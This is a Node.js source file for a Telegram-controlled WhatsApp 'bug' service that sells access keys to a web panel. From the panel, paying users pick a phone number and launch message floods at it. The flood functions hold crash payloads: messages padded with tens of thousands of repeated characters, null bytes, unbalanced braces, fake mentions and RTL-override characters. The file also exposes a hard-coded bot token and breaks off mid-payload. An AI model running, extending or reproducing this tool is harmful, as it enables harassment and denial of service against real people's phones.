// ==================== MODULE IMPORTS ==================== //
const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const AdmZip = require("adm-zip");
const tar = require("tar");
const os = require("os");
const fse = require("fs-extra");
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent
} = require('@whiskeysockets/baileys');

// ==================== CONFIGURATION ==================== //
const BOT_TOKEN = "8352756588:AAGAQyGdxzy-N-Fl8_ANOeC4sbrcB3mB5HA";
const OWNER_ID = "1259383610";
const bot = new Telegraf(BOT_TOKEN);
const { domain, port } = require("./database/config");
const app = express();

// ==================== GLOBAL VARIABLES ==================== //
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const cooldowns = {}; // key: username_mode, value: timestamp
let DEFAULT_COOLDOWN_MS = 5 * 60 * 1000; // default 5 menit
let userApiBug = null;
let sock;

// ==================== UTILITY FUNCTIONS ==================== //
// Helper sleep function

// ==================== UTILITY FUNCTIONS ==================== //

// Escape Markdown characters
function escapeMarkdown(text) {
  return text.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
}

// User management functions
function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
    console.log("✅ Data user berhasil disimpan.");
  } catch (err) {
    console.error("❌ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  } catch (err) {
    console.error("❌ Gagal membaca file user.json:", err);
    return [];
  }
}

function parseDuration(str) {
  if (!str || typeof str !== "string") return null;
  
  const match = str.match(/^(\d+)(s|m|h|d)$/i);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();

  switch (unit) {
    case "s": return value * 1000;            // detik → ms
    case "m": return value * 60 * 1000;       // menit → ms
    case "h": return value * 60 * 60 * 1000;  // jam → ms
    case "d": return value * 24 * 60 * 60 * 1000; // hari → ms
    default: return null;
  }
}

// ==================== GLOBAL COOLING SYSTEM ==================== //
// WhatsApp connection utilities
const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${escapeMarkdown(status.toUpperCase())}
├───────────────────────────┤
│ Nomor : ${escapeMarkdown(number)}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${escapeMarkdown(number)}
│ Kode  : ${escapeMarkdown(code)}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});

// ==================== WHATSAPP CONNECTION HANDLERS ==================== //

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return shouldReconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${escapeMarkdown(BotNumber)}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "DEWA1234");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "Markdown",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${escapeMarkdown(err.message)}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};
// ==================== BOT COMMANDS ==================== //

// Start command
bot.command("start", (ctx) => {
  const teks = `( 🍁 ) ─── ❖ 情報 ❖  
𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 × 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺  
─── 革命的な自動化システム ───  
高速・柔軟性・絶対的な安全性を備えた 次世代ボットが今、覚醒する。

〢「 𝐗𝐈𝐒 ☇ 𝐂𝐨𝐫𝐞 ° 𝐒𝐲𝐬𝐭𝐞𝐦𝐬 」
 ࿇ Author : —!s' anonymous_vxc
 ࿇ Type : ( Case─Plugins )
 ࿇ League : Asia/Jakarta-
┌─────────
├──── ▢ ( 𖣂 ) Sender Handler
├── ▢ owner users
│── /addbot — <nomor>
│── /listsender —
│── /delsender — <nomor>
│── /add — <cards.json>
└────
┌─────────
├──── ▢ ( 𖣂 ) Key Manager
├── ▢ admin users
│── /ckey — <username,durasi>
│── /listkey —
│── /delkey — <username>
└────
┌─────────
├──── ▢ ( 𖣂 ) Access Controls
├── ▢ owner users
│── /addacces — <user/id>
│── /delacces — <user/id>
│── /addowner — <user/id>
│── /delowner — <user/id>
│── /setjeda — <1m/1d/1s>
└────`;
  ctx.replyWithMarkdown(escapeMarkdown(teks));
});

// Sender management commands
bot.command("addbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }

  if (args.length < 2) {
    return ctx.reply(escapeMarkdown("❌ *Syntax Error!*\n\n_Use : /addbot Number_\n_Example : /addbot 628xxxx_"), { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Daftar Sender Aktif:*\n${escapeMarkdown(list)}`, 
    { parse_mode: "Markdown" });
});

bot.command("delbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (args.length < 2) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delsender Number_\n_Example : /delsender 628xxxx_", { parse_mode: "Markdown" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✅ Session untuk bot ${escapeMarkdown(number)} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

// Helper untuk cari creds.json
async function findCredsFile(dir) {
  const files = fs.readdirSync(dir, { withFileTypes: true });
  for (const file of files) {
    const fullPath = path.join(dir, file.name);
    if (file.isDirectory()) {
      const result = await findCredsFile(fullPath);
      if (result) return result;
    } else if (file.name === "creds.json") {
      return fullPath;
    }
  }
  return null;
}

// ===== Command /add =====
bot.command("add", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya owner yang bisa menggunakan perintah ini.");
  }

  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.document) {
    return ctx.reply("❌ Balas file session dengan `/add`");
  }

  const doc = reply.document;
  const name = doc.file_name.toLowerCase();
  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
    return ctx.reply("❌ File bukan session yang valid (.json/.zip/.tar/.tgz)");
  }

  await ctx.reply("🔄 Memproses session…");

  try {
    const link = await ctx.telegram.getFileLink(doc.file_id);
    const { data } = await axios.get(link.href, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fse.mkdtemp(path.join(os.tmpdir(), "sess-"));

    if (name.endsWith(".json")) {
      await fse.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fse.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    const credsPath = await findCredsFile(tmp);
    if (!credsPath) {
      return ctx.reply("❌ creds.json tidak ditemukan di dalam file.");
    }

    const creds = await fse.readJson(credsPath);
    const botNumber = creds.me.id.split(":")[0];
    const destDir = sessionPath(botNumber);

    await fse.remove(destDir);
    await fse.copy(tmp, destDir);
    saveActive(botNumber);

    await connectToWhatsApp(botNumber, ctx.chat.id, ctx);

    return ctx.reply(`✅ Session *${botNumber}* berhasil ditambahkan & online.`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error add session:", err);
    return ctx.reply(`❌ Gagal memproses session.\nError: ${err.message}`);
  }
});

// Key management commands
bot.command("ckey", (ctx) => {
  const userId = ctx.from.id.toString();
  const args   = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.telegram.sendMessage(
      userId,
      "[ ! ] - ONLY ACCES USER\n—Please register first to access this feature."
    );
  }
  
  if (!args || !args.includes(",")) {
    return ctx.telegram.sendMessage(
      userId,
      "❌ *Syntax Error!*\n\n_Use : /ckey User,Day_\n_Example : /ckey rann,30d",
      { parse_mode: "Markdown" }
    );
  }

  const [username, durasiStr] = args.split(",");
  const durationMs            = parseDuration(durasiStr.trim());
  if (!durationMs) {
    return ctx.telegram.sendMessage(
      userId,
      "❌ Format durasi salah! Gunakan contoh: 7d / 1d / 12h"
    );
  }

  const key     = generateKey(4);
  const expired = Date.now() + durationMs;
  const users   = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year    : "numeric",
    month   : "2-digit",
    day     : "2-digit",
    hour    : "2-digit",
    minute  : "2-digit",
    timeZone: "Asia/Jakarta"
  });

  // Kirim detail ke user (DM)
  ctx.telegram.sendMessage(
    userId,
    `✅ *Key berhasil dibuat:*\n\n` +
    `🆔 *Username:* \`${escapeMarkdown(username)}\`\n` +
    `🔑 *Key:* \`${escapeMarkdown(key)}\`\n` +
    `⏳ *Expired:* _${escapeMarkdown(expiredStr)}_ WIB\n\n` +
    `*Note:*\n- Jangan di sebar\n- Jangan Di Freekan\n- Jangan Di Jual Lagi`,
    { parse_mode: "Markdown" }
  ).then(() => {
    // Setelah terkirim → kasih notifikasi di group
    ctx.reply("✅ Success Send Key");
  }).catch(err => {
    ctx.reply("❌ Gagal mengirim key ke user.");
    console.error("Error kirim key:", err);
  });
});

bot.command("listkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `🕸️ *Active Key List:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `*${i + 1}. ${escapeMarkdown(u.username)}*\nKey: \`${escapeMarkdown(u.key)}\`\nExpired: _${escapeMarkdown(exp)}_ WIB\n\n`;
  });

  ctx.replyWithMarkdown(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey rann");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`❌ Username \`${escapeMarkdown(username)}\` not found.`, { parse_mode: "Markdown" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✅ Key belonging to *${escapeMarkdown(username)}* was successfully deleted.`, { parse_mode: "Markdown" });
});

// Access control commands
bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addacces Id_\n_Example : /addacces 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✅ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✅ Access granted to ID: ${escapeMarkdown(id)}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delacces Id_\n_Example : /delacces 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("❌ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✅ Access to user ID ${id} removed.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addowner Id_\n_Example : /addowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("❌ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✅ New owner added: ${escapeMarkdown(id)}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delowner Id_\n_Example : /delowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("❌ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✅ Owner ID ${escapeMarkdown(id)} was successfully deleted.`);
});

// ================== COMMAND /SETJEDA ================== //
bot.command("setjeda", async (ctx) => {
  const input = ctx.message.text.split(" ")[1]; 
  const ms = parseDuration(input);

  if (!ms) {
    return ctx.reply("❌ Format salah!\nContoh yang benar:\n- 30s (30 detik)\n- 5m (5 menit)\n- 1h (1 jam)\n- 1d (1 hari)");
  }

  globalThis.DEFAULT_COOLDOWN_MS = ms;
  DEFAULT_COOLDOWN_MS = ms; // sync ke alias lokal juga

  ctx.reply(`✅ Jeda berhasil diubah jadi *${input}* (${ms / 1000} detik)`);
});

// ==================== BOT INITIALIZATION ==================== //
console.clear();
console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡟⠛⠉⠙⢻⣿⡟⠋⠉⠙⢻⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣷⣀⣀⣠⣾⠛⣷⣄⣀⣀⣼⡏⠀⠀⠀⠀
⠀⠀⣀⠀⠀⠛⠋⢻⣿⣧⣤⣸⣿⡟⠙⠛⠀⠀⣀⠀⠀
⢀⣰⣿⣦⠀⠀⠀⠼⣿⣿⣿⣿⣿⡷⠀⠀⠀⣰⣿⣆⡀
⢻⣿⣿⣿⣧⣄⠀⠀⠁⠉⠉⠋⠈⠀⠀⣀⣴⣿⣿⣿⡿
⠀⠀⠀⠈⠙⠻⣿⣶⣄⡀⠀⢀⣠⣴⣿⠿⠛⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⣻⣿⣷⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣿⠿⠋⠉⠙⠿⣷⣦⣄⡀⠀⠀⠀⠀
⣴⣶⣶⣾⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣷⣶⣶⣦
⠙⢻⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡿⠋
⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀
╭╮╱╭┳━━━┳━━━┳╮╱╱╭━━━┳━━━┳━╮╱╭┳━━━╮
┃┃╱┃┃╭━╮┃╭━╮┃┃╱╱┃╭━╮┃╭━╮┃┃╰╮┃┃╭━╮┃
┃╰━╯┃┃╱┃┃╰━━┫┃╱╱┃┃╱┃┃┃╱┃┃╭╮╰╯┃┃╱┃┃
┃╭━╮┃┃╱┃┣━━╮┃┃╱╭┫┃╱┃┃┃╱┃┃┃╰╮┃┃┃╱┃┃
┃┃╱┃┃╰━╯┃╰━╯┃╰━╯┃╰━╯┃╰━╯┃┃╱┃┃┃╰━╯┃
╰╯╱╰┻━━━┻━━━┻━━━┻━━━┻━━━┻╯╱╰━┻━━━╯⠀⠀⠀⠀⠀⠀⠀
`));

bot.launch();
console.log(chalk.red(`
╭─☐ BOT DEWA-X APPS
├─ ID OWN : ${OWNER_ID}
├─ DEVOLOPER : RANNTZYBACK2 
├─ CREDIT BY : RANNTZYBACK2 
├─ MY SUPPORT : ALLAH 
├─ BOT : CONNECTED ✅
╰───────────────────`));

initializeWhatsAppConnections();

// ==================== WEB SERVER ==================== //
// ==================== WEB SERVER ==================== //
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/execution");
});

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./HCS-View/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✅ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["andros", "andros-delay"].includes(mode)) {
        return res.send(executionPage("✅ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("❌ Mode salah", {
        message: "Mode tidak dikenali. Gunakan ?mode=andros atau ?mode=ios."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("❌ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

    try {
      if (mode === "andros") {
        TornadoBlankChatV5(target);
        TornadoBlankChatV4(target);
        LocaInvis(sock, target);
      } else if (mode === "andros-delay") {
        LocaInvis(sock, target);
        LocaInvis(sock, target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      return res.send(executionPage("✅ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("❌ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(port, () => {
  console.log(`🚀 Server aktif di ${domain}:${port}`);
});

// ==================== EXPORTS ==================== //
module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

// ==================== FLOOD FUNCTIONS ==================== //
async function TornadoBlankChatV5(target) {
  const MSG = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "Xx".repeat(10000),
      inviteExpiration: "99999999999",
      groupName: "鈱佲儼饾悡饾悗饾悜饾悕饾悁饾悆饾悗 饾悂饾悑饾悁饾悕饾悐 饾悅饾悜饾悁饾悞饾悋嘟€汀蜏" + "釤勧煗".repeat(10000),
      caption: "釤勧煗".repeat(10000),
      contextInfo: {
      expiration: 1,
        ephemeralSettingTimestamp: 1,
        entryPointConversionSource: "WhatsApp.com",
        entryPointConversionApp: "WhatsApp",
        entryPointConversionDelaySeconds: 1,
          disappearingMode: {
            initiatorDeviceJid: target,
            initiator: "INITIATED_BY_OTHER",
            trigger: "UNKNOWN_GROUPS"
          },
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          mentionedJid: "0@s.whatsapp.net",
          questionMessage: {
          paymentInviteMessage: {
            serviceType: 1,
            expiryTimestamp: null
          }
        },
        externalAdReply: {
          showAdAttribution: false,
          renderLargerThumbnail: true
        }
      },
      body: {
        text: "鈱佲儼 鉄� 嗉� 鈻攫潗擆潗庰潗戰潗嶐潗€饾悆饾悗 馃└ 饾悧蜏-饾悡饾悜饾悁饾悞饾悋鉄� 嗉� 鈻距絸" +
              "釤勧煗".repeat(25000) +
              "軎�".repeat(25000) +
              "@5".repeat(50000),
      },
      nativeFlowMessage: {
        messageParamJson: "{".repeat(25000),
      },
        buttons: [
          {
            name: "cta_url",
            buttonParamJson: "\u0000".repeat(25000),
          },
        ],
      },
    };
  
  await sock.relayMessage(target, MSG, {
    participant: { jid: target },
    messageId: null,
  });
}
async function TornadoBlankChatV4(target) {
  const MSG = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "Xx".repeat(10000),
      inviteExpiration: "99999999999",
      groupName: "鈱佲儼饾悂饾悑饾悁饾悕饾悐 饾悅饾悜饾悁饾悞饾悋 饾悂饾悩 饾悡饾悗饾悜饾悕饾悁饾悆饾悗嘟€" + "釤勧煗".repeat(10000),
      caption: "釤勧煗".repeat(10000),
      contextInfo: {
        expiration: 1,
          ephemeralSettingTimestamp: 1,
          entryPointConversionSource: "WhatsApp.com",
          entryPointConversionApp: "WhatsApp",
          entryPointConversionDelaySeconds: 1,
            disappearingMode: {
              initiatorDeviceJid: target,
              initiator: "INITIATED_BY_OTHER",
              trigger: "UNKNOWN_GROUPS"
            },
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [
  "0@s.whatsapp.net",
  ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
],
              questionMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            nativeFlowMessage: {
              messageParamJson: "{".repeat(20000),
            },
            buttons: [
            {
            name: "mpm",
              buttonParamsJson: "\u0000".repeat(20000),
            },
          ],
       },
    };
      
    await sock.relayMessage(target, MSG, {
      participant: { jid: target },
      messageId: null
    });
  }
async function LocaInvis(sock, target) {
  try {
    const msgContent = {
      viewOnceMessage: {
        message: {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "𝟏.𝟏.𝟏.𝟏# 𝐒𝐚𝐯𝐞" + "\u202E".repeat(500) + "\uDBFF\uDFFF".repeat(1000),
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 992.999999,
